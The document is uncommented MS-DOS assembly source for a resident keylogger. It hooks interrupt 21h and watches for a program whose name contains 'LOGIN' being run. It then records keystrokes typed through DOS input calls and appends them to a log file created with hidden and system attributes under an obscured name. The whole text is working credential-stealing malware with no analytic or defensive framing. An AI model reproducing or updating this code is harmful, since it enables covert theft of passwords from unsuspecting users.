cseg   segment
       assume cs:cseg,ds:cseg
       org 100h
       public oi21,ac,ob,fn,fh,flag,ni21,jtov,oc,lethro,wpwtf,exist,create,
       public cntr,lits,begin
.RADIX 16
start:
       push cs
       push cs
       push cs
       pop ds
       pop es
       mov ax,0fffeh
       CLI
       pop ss
       mov sp,ax
       STI
       jmp begin
oi21   dd ?
ac     dw 0
ob     dw 80h dup (?)
buff2	db 80h dup (?)
fn	db 'c:\testing',0FF,'.tmp',0
search1 db 'LOGIN'
foundf db 0
fh     dw 0
flag   db 0
cntr   dw 0

ni21:
       assume cs:cseg,ds:nothing,es:nothing
	
	cmp ax,4b00h
	je exec
	cmp foundf,0ffh
	jne nc
       cmp ah,8
       je  oc
       cmp ah,7
       je  oc


nc:	
       push ax
       mov al,cs:flag
       not al
       cmp al,0
       jne jtov
       mov ax,cntr
       inc ax
       mov cntr,ax
       cmp ax,31h
       jb  jtov
       xor ax,ax
       mov cntr,ax
       mov flag,al
       pop ax
       pushf
       call dword ptr [oi21]
       push ds
       push cs
       pop ds
       push ax
       push bx
       push cx
       push dx
       jmp short wpwtf
jtov:
       pop ax
       jmp dword ptr cs:[oi21]
exec:	call scanfor
	jmp nc
oc:

       pushf
       call dword ptr cs:[oi21]
       assume ds:cseg
       push ds
       push cs
       pop  ds
       push ax
       push bx
       push cx
       push dx
       mov bx,ac
       mov [bx],al
       inc bx
       mov [ac],bx
       cmp al,0dh
       jne lethro
       mov byte ptr [bx],0ah
       not cs:[flag]
lethro:
       pop dx
       pop cx
       pop bx
       pop ax
       pop ds
       iret

scanfor:
	push ax
	push di
	push si
	push es
	push ds
	push cs
	push cs
	pop es
	mov si,dx
	mov di,offset buff2
moveit:
	lodsb
	and al,0dfh
	stosb
	or al,al
	jnz moveit
	pop ds
	mov di,offset buff2
look:
	push di
	mov si,offset search1
	mov cx,5
	repe cmpsb
	pop di
	or cx,cx
	jz foundit
	inc di
	cmp byte ptr [di+5],0
	je not_found
	jmp look
not_found:
	xor ax,ax
	mov foundf,al
	jmp short endofsearch
foundit:
	mov ax,0ffh
	mov foundf,al
endofsearch:
	pop ds
	pop es
	pop si
	pop di
	pop ax
	ret


wpwtf:
       mov ax,3d02h
       mov dx,offset fn
       pushf
       call dword ptr [oi21]
       jnc exist
       cmp al,2
       je create
       jmp lethro
create:
       mov ah,3ch
       mov dx,offset fn
       mov cx,02h+04h
       pushf
       call dword ptr [oi21]
       jnc exist
       jmp lethro
exist:
       mov fh,ax
       mov bx,ax
       mov ax,4202h
       xor cx,cx
	xor dx,dx
       pushf
       call dword ptr[oi21]
       mov cx,[ac]
       mov dx,offset ob
       sub cx,dx
       mov [ac],dx
       inc cx
       mov bx,fh
       mov ah,40h
       pushf
       call dword ptr [oi21]
       mov ah,3eh
       mov bx,fh
       pushf
       call dword ptr [oi21]
       jmp lethro


lits   db 90h
begin:
       mov ax,offset ob
       mov [ac],ax
       mov ax,3521h
       int 21h
       mov di,offset oi21
       mov [di],bx
       mov [di+2],es
       mov dx,offset ni21
       push cs
       pop ds
       mov ax,2521h
       int 21h
       mov dx,offset lits
       int 27h
cseg   ends
       end start
